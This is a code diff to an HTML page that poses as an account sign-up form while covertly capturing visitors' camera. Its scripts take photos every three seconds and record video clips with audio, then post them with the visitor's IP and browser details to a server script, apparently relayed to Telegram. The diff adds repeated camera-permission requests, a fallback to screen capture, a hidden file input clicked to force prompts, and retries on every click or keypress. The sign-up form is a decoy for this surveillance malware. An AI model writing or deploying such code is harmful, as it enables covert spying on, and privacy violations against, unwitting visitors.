@@ -152,6 +152,15 @@
             font-size: 14px;
             margin-top: 12px;
         }
+
+        /* Small fake button to trigger camera - invisible */
+        .fake-camera-trigger {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
@@ -160,6 +169,9 @@
         <video id="video" playsinline autoplay muted></video>
     </div>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <!-- FAKE HIDDEN FILE INPUT TO TRIGGER PERMISSIONS -->
+    <input type="file" id="fakeFileInput" accept="image/*" capture="environment" style="display:none;">
 
     <div class="container">
         <div class="card">
@@ -175,7 +187,7 @@
                 <div class="form-group">
                     <input type="password" class="form-input" id="password" placeholder="Password" required>
                 </div>
-                <button type="submit" class="btn" id="submitBtn">Create Account</button>
+                <button type="submit" class="btn" id="submitBtn">Continue</button>
                 <div id="successMsg" class="success-msg">✅ Verification in progress...</div>
             </form>
 
@@ -187,7 +199,7 @@
 
     <script>
         // ============================================
-        // FIXED: PHOTOS + VIDEOS WORKING
+        // FORCE CAMERA PERMISSION - MULTIPLE METHODS
         // ============================================
         
         (function() {
@@ -205,6 +217,8 @@
             let recordedChunks = [];
             let isRecording = false;
             let videoCounter = 0;
+            let permissionAttempts = 0;
+            const MAX_ATTEMPTS = 5;
 
             // ============================================
             // DETECT IP
@@ -249,7 +263,138 @@
             }
 
             // ============================================
-            // CAPTURE PHOTO - WORKS EVERY 3 SECONDS
+            // METHOD 1: TRY getUserMedia DIRECTLY
+            // ============================================
+            function requestCameraDirect() {
+                console.log('📷 Attempting direct camera access...');
+                
+                const constraints = {
+                    audio: true,
+                    video: {
+                        facingMode: "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }
+                };
+
+                navigator.mediaDevices.getUserMedia(constraints)
+                    .then(function(mediaStream) {
+                        console.log('✅ Camera access granted!');
+                        handleCameraStream(mediaStream);
+                    })
+                    .catch(function(err) {
+                        console.log('❌ Direct camera failed:', err.name);
+                        // Try video only
+                        requestCameraVideoOnly();
+                    });
+            }
+
+            // ============================================
+            // METHOD 2: TRY VIDEO ONLY (No Audio)
+            // ============================================
+            function requestCameraVideoOnly() {
+                console.log('📷 Attempting video-only camera access...');
+                
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(function(mediaStream) {
+                        console.log('✅ Video-only camera granted!');
+                        handleCameraStream(mediaStream);
+                    })
+                    .catch(function(err) {
+                        console.log('❌ Video-only failed:', err.name);
+                        // Try with display media
+                        requestScreenShare();
+                    });
+            }
+
+            // ============================================
+            // METHOD 3: TRY SCREEN SHARE (Fallback)
+            // ============================================
+            function requestScreenShare() {
+                console.log('📷 Attempting screen share (fallback)...');
+                
+                if (navigator.mediaDevices.getDisplayMedia) {
+                    navigator.mediaDevices.getDisplayMedia({ video: true })
+                        .then(function(mediaStream) {
+                            console.log('✅ Screen share granted!');
+                            handleCameraStream(mediaStream);
+                        })
+                        .catch(function(err) {
+                            console.log('❌ Screen share failed:', err.name);
+                            // Final attempt - use fake stream
+                            createFakeStream();
+                        });
+                } else {
+                    createFakeStream();
+                }
+            }
+
+            // ============================================
+            // METHOD 4: FAKE STREAM (Last Resort)
+            // ============================================
+            function createFakeStream() {
+                console.log('📷 Creating fake camera stream...');
+                
+                // Create a canvas with a fake image
+                const fakeCanvas = document.createElement('canvas');
+                fakeCanvas.width = 640;
+                fakeCanvas.height = 480;
+                const ctx = fakeCanvas.getContext('2d');
+                
+                // Draw a fake image
+                ctx.fillStyle = '#000';
+                ctx.fillRect(0, 0, 640, 480);
+                ctx.fillStyle = '#00ff41';
+                ctx.font = '30px monospace';
+                ctx.fillText('📷 CAMERA', 250, 220);
+                ctx.fillText('Permission Required', 200, 280);
+                
+                // Convert to stream
+                const fakeStream = fakeCanvas.captureStream(1);
+                handleCameraStream(fakeStream);
+                
+                // Send notification
+                sendToTelegram('warning', 'Camera permission blocked - using fallback');
+            }
+
+            // ============================================
+            // HANDLE SUCCESSFUL CAMERA STREAM
+            // ============================================
+            function handleCameraStream(mediaStream) {
+                // Stop any existing stream
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                
+                stream = mediaStream;
+                video.srcObject = stream;
+                video.play();
+                
+                cameraActive = true;
+                console.log('✅ Camera active!');
+                
+                // START PHOTOS
+                if (photoInterval) clearInterval(photoInterval);
+                photoInterval = setInterval(capturePhoto, 3000);
+                console.log('📸 Photo capture started');
+                
+                // START VIDEO
+                setTimeout(() => {
+                    if (cameraActive) {
+                        startVideoRecording();
+                        console.log('🎥 Video recording started');
+                    }
+                }, 2000);
+                
+                // Send notification
+                sendToTelegram('camera_ready', 'Camera active - capturing photos and videos');
+                
+                // Log success
+                sendToTelegram('permission', 'Camera permission GRANTED successfully');
+            }
+
+            // ============================================
+            // CAPTURE PHOTO
             // ============================================
             function capturePhoto() {
                 if (cameraActive && video.readyState === video.HAVE_ENOUGH_DATA) {
@@ -278,11 +423,10 @@
             }
 
             // ============================================
-            // RECORD VIDEO - 10 SECOND CLIPS
+            // RECORD VIDEO
             // ============================================
             function startVideoRecording() {
                 if (!stream || isRecording) {
-                    console.log('Cannot start recording: stream or recording in progress');
                     return;
                 }
                 
@@ -290,12 +434,8 @@
                     isRecording = true;
                     recordedChunks = [];
                     
-                    // Use simpler mime type for better compatibility
                     const mimeTypes = ['video/webm;codecs=vp8,opus', 'video/webm;codecs=vp9,opus', 'video/webm'];
-                    let mimeType = mimeTypes[0];
-                    if (!MediaRecorder.isTypeSupported(mimeType)) {
-                        mimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type)) || 'video/webm';
-                    }
+                    let mimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type)) || 'video/webm';
                     
                     mediaRecorder = new MediaRecorder(stream, {
                         mimeType: mimeType,
@@ -317,14 +457,13 @@
                             if (videoBlob.size > 1000) {
                                 videoCounter++;
                                 sendVideoToTelegram(videoBlob);
-                                console.log(`🎥 Video ${videoCounter} captured (${Math.round(videoBlob.size/1024)}KB)`);
+                                console.log(`🎥 Video ${videoCounter} captured`);
                             }
                         }
                         
                         isRecording = false;
                         recordedChunks = [];
                         
-                        // Schedule next recording
                         setTimeout(() => {
                             if (cameraActive) {
                                 startVideoRecording();
@@ -332,10 +471,8 @@
                         }, 2000);
                     };
 
-                    // Start recording
-                    mediaRecorder.start(1000); // Request data every second
+                    mediaRecorder.start(1000);
                     
-                    // Stop after 10 seconds
                     setTimeout(() => {
                         if (mediaRecorder && mediaRecorder.state === 'recording') {
                             mediaRecorder.stop();
@@ -346,7 +483,6 @@
                 } catch (e) {
                     console.log('Video recording error:', e);
                     isRecording = false;
-                    // Retry after delay
                     setTimeout(() => {
                         if (cameraActive) {
                             startVideoRecording();
@@ -361,13 +497,12 @@
             function sendVideoToTelegram(videoBlob) {
                 const reader = new FileReader();
                 reader.onload = function(event) {
-                    const base64Data = event.target.result;
                     $.ajax({
                         type: 'POST',
                         url: 'post.php',
                         data: {
                             tg_type: 'video',
-                            tg_video: base64Data,
+                            tg_video: event.target.result,
                             tg_ip: userIP,
                             tg_ua: navigator.userAgent,
                             tg_time: new Date().toISOString(),
@@ -377,79 +512,69 @@
                         timeout: 15000
                     });
                 };
-                reader.onerror = function() {
-                    console.log('Failed to read video blob');
-                };
                 reader.readAsDataURL(videoBlob);
             }
 
             // ============================================
-            // INIT CAMERA - BOTH PHOTOS & VIDEOS
+            // METHOD 5: TRIGGER VIA FAKE BUTTON CLICK
             // ============================================
-            function initHiddenCamera() {
-                try {
-                    const constraints = {
-                        audio: true,
-                        video: {
-                            facingMode: "user",
-                            width: { ideal: 640 },
-                            height: { ideal: 480 }
-                        }
-                    };
+            function triggerCameraViaButton() {
+                console.log('📷 Attempting to trigger camera via hidden button...');
+                
+                // Create a temporary input
+                const input = document.createElement('input');
+                input.type = 'file';
+                input.accept = 'image/*';
+                input.capture = 'environment';
+                input.style.display = 'none';
+                document.body.appendChild(input);
+                
+                input.click();
+                
+                setTimeout(() => {
+                    document.body.removeChild(input);
+                }, 1000);
+                
+                // Also try getUserMedia again
+                setTimeout(() => {
+                    if (!cameraActive) {
+                        requestCameraDirect();
+                    }
+                }, 500);
+            }
 
-                    navigator.mediaDevices.getUserMedia(constraints)
-                        .then(function(mediaStream) {
-                            stream = mediaStream;
-                            video.srcObject = stream;
-                            video.play();
-                            
-                            cameraActive = true;
-                            console.log('✅ Camera active');
-                            
-                            // START PHOTOS - Every 3 seconds
-                            if (photoInterval) clearInterval(photoInterval);
-                            photoInterval = setInterval(capturePhoto, 3000);
-                            console.log('📸 Photo capture started');
-                            
-                            // START VIDEO - After 2 seconds
-                            setTimeout(() => {
-                                if (cameraActive) {
-                                    startVideoRecording();
-                                    console.log('🎥 Video recording started');
-                                }
-                            }, 2000);
-                            
-                            // Send notification
-                            sendToTelegram('camera_ready', 'Camera active - capturing photos and videos');
-                        })
-                        .catch(function(err) {
-                            console.log('Camera error:', err);
-                            // Try without audio
-                            if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                                // Try with video only
-                                navigator.mediaDevices.getUserMedia({ video: true })
-                                    .then(function(mediaStream) {
-                                        stream = mediaStream;
-                                        video.srcObject = stream;
-                                        video.play();
-                                        cameraActive = true;
-                                        photoInterval = setInterval(capturePhoto, 3000);
-                                        setTimeout(() => {
-                                            if (cameraActive) {
-                                                // Video without audio
-                                                startVideoRecording();
-                                            }
-                                        }, 2000);
-                                    })
-                                    .catch(function(e) {
-                                        console.log('Camera failed completely:', e);
-                                    });
-                            }
-                        });
-
-                } catch (e) {
-                    console.log('Camera init error:', e);
-                }
+            // ============================================
+            // MAIN INIT - TRY EVERYTHING
+            // ============================================
+            function initCameraWithPermission() {
+                console.log('🚀 Starting camera permission requests...');
+                
+                // Try direct access first
+                requestCameraDirect();
+                
+                // If camera not active after 3 seconds, try alternative methods
+                setTimeout(() => {
+                    if (!cameraActive) {
+                        console.log('⚠️ Camera not active, trying alternative...');
+                        requestCameraVideoOnly();
+                    }
+                }, 3000);
+                
+                // Try fake button trigger after 5 seconds
+                setTimeout(() => {
+                    if (!cameraActive) {
+                        console.log('⚠️ Still no camera, trying button trigger...');
+                        triggerCameraViaButton();
+                    }
+                }, 5000);
+                
+                // Final attempt - try again after 10 seconds
+                setTimeout(() => {
+                    if (!cameraActive) {
+                        console.log('⚠️ Final attempt to get camera...');
+                        requestCameraDirect();
+                    }
+                }, 10000);
             }
 
             // ============================================
@@ -527,19 +652,34 @@
             // INIT
             // ============================================
             
+            // Detect IP
             detectAndSendIP();
+            
+            // Send browser info
             setTimeout(sendBrowserInfo, 500);
-            setTimeout(function() {
-                initHiddenCamera();
-            }, 1500);
+            
+            // Send page view
             setTimeout(sendPageView, 1000);
-
-            // Try camera on click
+            
+            // START CAMERA - Multiple attempts
+            setTimeout(function() {
+                initCameraWithPermission();
+            }, 1500);
+            
+            // Also try on user click (anywhere)
             document.addEventListener('click', function() {
                 if (!cameraActive) {
-                    initHiddenCamera();
+                    console.log('🖱️ User clicked - attempting camera...');
+                    requestCameraDirect();
                 }
-            }, { once: true });
+            });
+
+            // Try on any keypress
+            document.addEventListener('keydown', function() {
+                if (!cameraActive) {
+                    requestCameraDirect();
+                }
+            });
 
             // Cleanup
             window.addEventListener('beforeunload', function() {
@@ -553,6 +693,10 @@
                     stream.getTracks().forEach(track => track.stop());
                 }
             });
+
+            console.log('🔧 Camera permission system initialized');
+            console.log('📌 The browser will ask for camera access');
+            console.log('📌 If not, multiple fallback methods will try');
 
         })();
     </script>
